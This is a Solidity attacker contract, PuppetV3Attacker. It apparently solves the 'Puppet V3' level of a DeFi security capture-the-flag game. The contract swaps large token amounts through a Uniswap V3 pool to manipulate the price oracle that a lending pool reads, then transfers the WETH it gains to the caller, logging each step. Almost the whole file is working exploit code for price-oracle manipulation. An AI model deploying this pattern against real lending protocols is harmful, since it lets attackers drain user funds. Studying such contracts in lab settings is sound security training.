// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;
pragma abicoder v2;

import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

import "./PuppetV3Pool.sol";

import "hardhat/console.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV3SwapCallback {
    /// @notice Called to `msg.sender` after executing a swap via IUniswapV3Pool#swap.
    /// @dev In the implementation you must pay the pool tokens owed for the swap.
    /// The caller of this method must be checked to be a UniswapV3Pool deployed by the canonical UniswapV3Factory.
    /// amount0Delta and amount1Delta can both be 0 if no tokens were swapped.
    /// @param amount0Delta The amount of token0 that was sent (negative) or must be received (positive) by the pool by
    /// the end of the swap. If positive, the callback must send that amount of token0 to the pool.
    /// @param amount1Delta The amount of token1 that was sent (negative) or must be received (positive) by the pool by
    /// the end of the swap. If positive, the callback must send that amount of token1 to the pool.
    /// @param data Any data passed through by the caller via the IUniswapV3PoolActions#swap call
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external;
}
contract PuppetV3Attacker is IUniswapV3SwapCallback {
    IERC20 public token;
    IWETH public weth;
    PuppetV3Pool public lendingPool;
    IUniswapV3Pool public uniswapV3Pool;

    constructor(address _token, address _weth, address _pools, address _uniswap) {
        token = IERC20(_token);
        weth = IWETH(_weth);
        lendingPool = PuppetV3Pool(_pools);
        uniswapV3Pool = IUniswapV3Pool(_uniswap);   
    }

    function swap(int256 amount) external {
        console.log("Swapping %s Tokens For WETH", uint256(amount));

        uniswapV3Pool.swap(
            address(this),
            false,
            amount,
            TickMath.MAX_SQRT_RATIO - 1,
            ""
        );

        weth.transfer(address(msg.sender), weth.balanceOf(address(this)));
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external override {
        console.log("Amount0Delta: %s", uint256(amount0Delta));
        console.log("Amount1Delta: %s", uint256(amount1Delta));

        uint256 amount1 = uint256(amount1Delta);

        console.log("Attacker Contract Balance: %s", token.balanceOf(address(this)));
        console.log("Transferring %s Tokens to UniswapV3Pool", amount1);

        token.transfer(address(uniswapV3Pool), amount1);

        console.log("Approving UniswapV3Pool to spend Tokens");
    }
}